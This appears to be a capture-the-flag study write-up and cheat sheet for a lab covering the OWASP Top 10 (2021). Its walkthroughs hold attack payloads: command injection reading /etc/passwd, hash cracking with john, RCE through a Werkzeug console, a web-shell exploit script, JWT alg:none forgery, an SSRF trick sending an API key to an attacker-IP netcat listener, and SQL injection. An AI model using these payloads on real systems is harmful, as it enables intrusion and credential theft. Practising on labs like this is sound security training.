# OWASP Top 10 - 2021 

This is a summary of the core concepts, attack techniques, and cheatsheets for the 10 most critical web application vulnerabilities as ranked by OWASP.

---

## 1. 🚀 A01: Broken Access Control

### 1.1 Core Concept

This vulnerability occurs when the server **fails to validate authorization**, allowing a standard user to access data or functions reserved for privileged users (like an Admin).

**IDOR (Insecure Direct Object Reference)** is the most common form. This happens when an application exposes an "ID" for an object (e.g., `id=111111`) in a URL, and an attacker can simply "edit" that ID to view someone else's data (e.g., `id=222222`).

### 1.2 The Challenge

(Task 4) Find the IDOR vulnerability in a fake banking application.

### 1.3 Attack Walkthrough

1. Analyze: Log in to the application (as jclarke) and observe the URL:
    
    https://bank.thm/account?id=111111
    
2. Attack: "Edit" the URL, changing the id parameter to another user's ID:
    
    https://bank.thm/account?id=222222
    
3. **Result:** The application displays the account details for Account #222222 (belonging to Nick Perry), confirming the IDOR vulnerability.
    

---

## 2. 🤫 A02: Cryptographic Failures

### 2.1 Core Concept

This occurs when an application **fails to use cryptography** (or uses it poorly) to protect sensitive data.

- **Data in Transit:** Failing to use `HTTPS`.
    
- **Data at Rest:** (Critical) Storing sensitive data (like national IDs, passwords) in a database as **"plaintext"** or using a **"weak" hash** (like MD5).
    

### 2.2 The Challenge

(Task 8) Find an exposed database, extract credentials, crack the hash, and log in.

### 2.3 Attack Walkthrough

1. **Recon:** Inspecting the page's source code reveals a developer comment hinting at an `/assets` directory.
    
2. **Discovery:** Browsing to `/assets` reveals a flat-file (SQLite) database, `webapp.db`, which we can download.
    
3. **Analysis:** Use `sqlite3` to open `webapp.db` and dump the `users` table:
    
    Bash
    
    ```
    sqlite> .tables
    users
    sqlite> SELECT * FROM users;
    admin | 6eea9b7ef19179a06954edd0f6c05ceb
    ```
    
4. **Cracking:** Take the hash (`6eea...`) (which is MD5) and crack it using `rockyou.txt`:
    
    Bash
    
    ```
    # (On Attacker Machine)
    echo "6eea9b7ef19179a06954edd0f6c05ceb" > hash.txt
    john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    # Result: qwertyuiop
    ```
    
5. **Access:** Log in with `admin`:`qwertyuiop` to get the flag.
    

---

## 3. 💉 A03: Injection

### 3.1 Core Concept

This occurs when an application **"interprets"** user-controlled input as a **"command."**

- **SQL Injection:** User input is executed as a SQL query.
    
- **Command Injection:** User input is executed as an OS command (like `ls`, `whoami`).
    

### 3.2 The Challenge

(Task 10) Exploit a Command Injection vulnerability on the "Cowsay Online" website to read server data.

### 3.3 Attack Walkthrough

1. **Analyze:** The application uses a PHP `passthru("... -f $cow $mooing");` call, which directly concatenates user input into an OS command.
    
2. **Attack:** Use Bash "Inline Command" syntax `$(...)` to execute our command _inside_ the Cowsay command.
    
    - **Payload 1:** `$(cat /etc/passwd)` (To see all users)
        
    - **Payload 2:** `$(cat /etc/os-release)` (To find the Alpine Linux version)
        
    - **Payload 3:** `$(ls /var/www/html)` (To find hidden files in the web root)
        

---

## 4. 📐 A04: Insecure Design

### 4.1 Core Concept

A vulnerability that stems from a "flaw" in the application's "logic" or "architecture" (its design), not just a simple coding bug.

_Example:_ A password reset rate-limit that is based only on IP address. An attacker can bypass this by using thousands of different IPs (a distributed attack), which the designers failed to consider.

### 4.2 The Challenge

(Task 11) Break into `joseph`'s account by finding a design flaw in the password reset mechanism.

### 4.3 Attack Walkthrough

1. **Analyze:** The "Security Question" page for `joseph` has **no rate-limit** on incorrect guesses.
    
2. **Attack (Brute-force):**
    
    - Use **Burp Suite** to intercept the request when submitting an answer (e.g., `answer=test`).
        
    - Send this request to **Intruder**.
        
    - Set the payload position (`§...§`) on the value of the `answer` parameter.
        
    - Use a wordlist (like `rockyou.txt`) as the payload list.
        
    - Start the attack and look for a response with a different `Length` or `Status` code, which indicates the correct answer.
        

---

## 5. 🛠️ A05: Security Misconfiguration

### 5.1 Core Concept

This occurs when software is "configured" incorrectly or "unnecessary features" are left enabled.

- Using default credentials (e.g., `admin:admin`).
    
- Leaving **Debugging Interfaces** enabled in production.
    
- Showing overly detailed error messages.
    

### 5.2 The Challenge

(Task 12) Exploit a forgotten **Werkzeug (Python)** debug console to read the application's source code.

### 5.3 Attack Walkthrough

1. **Recon:** Scan shows port `86` is open.
    
2. **Discovery:** Guessing default paths reveals the debug console at `http://[IP]:86/console`.
    
3. **Exploit (RCE):** This console allows us to run arbitrary Python code on the server.
    
    - `print(os.popen("ls -l").read())` (To find the `.db` file)
        
    - `print(os.popen("cat app.py").read())` (To read the source code)
        
4. **Loot:** Find the `secret_flag` variable within the source code.
    

---

## 6. 📦 A06: Vulnerable and Outdated Components

### 6.1 Core Concept

Using third-party software, libraries, or frameworks that are **"outdated"** and have **"known vulnerabilities"** because they were **"forgotten to be patched."**

### 6.2 The Challenge

(Task 15) Exploit an "Online Book Store" application running on an outdated server.

### 6.3 Attack Walkthrough

1. **Recon:** Identify the application as "Online Book Store 1.0" (running on Apache).
    
2. **Research:** Use `searchsploit online book store`.
    
3. **Find Exploit:** Discover the script `php/webapps/47887.py` (Unauthenticated RCE).
    
4. **Exploit:** Run the exploit script:
    
    Bash
    
    ```
    python3 /usr/share/exploitdb/exploits/php/webapps/47887.py http://[IP]:84/
    ```
    
5. **Access:** The script uploads a web shell and provides an RCE shell.
    
    Bash
    
    ```
    RCE $ cat /opt/flag.txt
    THM{But_1ts_n0t_my_f4ult!}
    ```
    

---

## 7. 🆔 A07: Identification and Authentication Failures

### 7.1 Core Concept

Flaws in the "logic" of login or session management.

- **Brute-force:** No limit on login attempts.
    
- **Weak Credentials:** Allowing passwords like `password123`.
    
- **Weak Sessions:** Predictable session cookies.
    

### 7.2 The Challenge

(Task 17) Exploit a "Re-registration" vulnerability to take over `darren`'s account.

### 7.3 Attack Walkthrough

1. **Analyze:** Attempting to register as `darren` fails (User exists).
    
2. **Attack (Logic Flaw):**
    
    - Attempt to register with the username `" darren"` (with a leading **"space"**).
        
    - The system fails to "trim" the input, sees it as a new user, and creates the account.
        
3. **Result:** The application logs us in as `" darren"` but (due to a logic flaw) retrieves the data for the _real_ `darren`, giving us the flag.
    

---

## 8. ⛓️ A08: Software and Data Integrity Failures

### 8.1 Core Concept

Occurs when an application "trusts" data or software without an **"Integrity Check"** to see if it was modified.

- **Software Failure:** Loading a JS library from a CDN without using **SRI (Subresource Integrity)** (the `integrity="..."` attribute).
    
- **Data Failure:** Trusting data in a Cookie or Token that the user can modify.
    

### 8.2 The Challenge

(Task 20) Exploit a **JWT (JSON Web Token)** using the **`alg: none`** vulnerability.

### 8.3 Attack Walkthrough

1. Recon: Log in as guest and grab the JWT from the cookie.
    
    [HEADER].[PAYLOAD].[SIGNATURE]
    
2. **Decode:**
    
    - Header: `{"typ":"JWT","alg":"HS256"}`
        
    - Payload: `{"username":"guest", ...}`
        
3. **Modify:**
    
    - New Header: `{"typ":"JWT","alg":"none"}`
        
    - New Payload: `{"username":"admin", ...}`
        
4. **Encode:** Base64 encode the new Header and Payload.
    
5. Forge: Create the new token by "deleting the signature" (but keeping the final dot .)
    
    [NEW_HEADER_ENCODED].[NEW_PAYLOAD_ENCODED].
    
6. **Access:** Paste this forged token into the browser's cookie and refresh the page.
    

---

## 9. 📉 A09: Security Logging and Monitoring Failures

### 9.1 Core Concept

Not an exploit, but a failure that makes attacks **"undetectable"** or **"untraceable."**

- **Logging Failure:** Not logging critical events (IP, Username, Timestamp, Status Code).
    
- **Monitoring Failure:** Having logs but "never reading them" or "having no alerts" for suspicious activity.
    

### 9.2 The Challenge

(Task 21) Analyze a log file to find suspicious activity.

### 9.3 Attack Walkthrough

1. **Analyze Log:**
    
    ```
    401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
    401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
    401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
    401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
    ```
    
2. **Result:** This is a clear **Brute-force** attack (single IP, rapid failures (`401`), common default usernames).
    

---

## 10. 🔄 A10: Server-Side Request Forgery (SSRF)

### 10.1 Core Concept

A vulnerability where an attacker can "force" the "Server-Side" to send a request to a destination the attacker chooses. Often used to:

- Steal API Keys (by making the server send a request to the attacker's machine).
    
- Scan the internal network.
    
- Access internal admin panels (e.g., `127.0.0.1/admin`).
    

### 10.2 The Challenge

(Task 22) Use SSRF to steal an API key and access the admin panel.

### 10.3 Attack Walkthrough

1. **Recon:** Find a page with a `.../download?server=secure-file-storage.com...` parameter.
    
2. **Attack 1 (Steal Key):**
    
    - (Attacker) Start a listener: `nc -lvp 80`
        
    - (Victim) Send Payload: `.../download?server=[ATTACKER_IP]`
        
    - (Attacker) `netcat` catches the request and the `X-API-Key: ...` header.
        
3. **Attack 2 (Access Admin):**
    
    - (Victim) Send Payload: `.../download?server=127.0.0.1:8087&id=/admin`
        
    - **Result:** The server "tricks itself," fetches the `/admin` page (which is normally internal-only), and displays it to us, revealing the flag.
        

---

---

# 🚀 OWASP Top 10 - Cheat Sheet

|**🧠 If you see...**|**🚀 Try this technique...**|**🎯 Vulnerability**|
|---|---|---|
|An ID parameter in the URL (e.g., `id=123`)|Change the number (e.g., `id=124`)|**A01: IDOR**|
|A database file (`.db`, `.sql`) in a public folder|Download it -> Use `sqlite3` or `john` to crack hashes|**A02: Cryptographic Failures**|
|A webpage that runs an OS command (like Cowsay)|Inject `$(whoami)` or `$(ls)`|**A03: Command Injection**|
|An input field that seems unfiltered|Inject `' OR 1=1 --`|**A03: SQL Injection**|
|A password reset page that lets you guess forever|Use **Burp Intruder** with a wordlist|**A04: Insecure Design**|
|An error page showing `Werkzeug` or a `/console`|Run Python code (e.g., `print(os.popen('id').read())`)|**A05: Security Misconfiguration**|
|Outdated software (e.g., `Nostromo 1.9.6`)|Use **`searchsploit [Software_Name]`** to find an exploit|**A06: Vulnerable Components**|
|A registration page|Try to register a username with a "space" (e.g., `" admin"`)|**A07: Authentication Failures**|
|A **JWT Token** in your cookie|"Decode" -> Change `alg` to `none` -> "Edit" payload -> "Delete" signature|**A08: Data Integrity Failures**|
|Rapid `401` (Unauthorized) logs from a single IP|This is a **Brute-force** attack|**A09: Logging Failures**|
|A URL parameter that "fetches" another URL (e.g., `?url=...` or `?server=...`)|Change the value to `127.0.0.1` or your attacker IP|**A10: SSRF**|
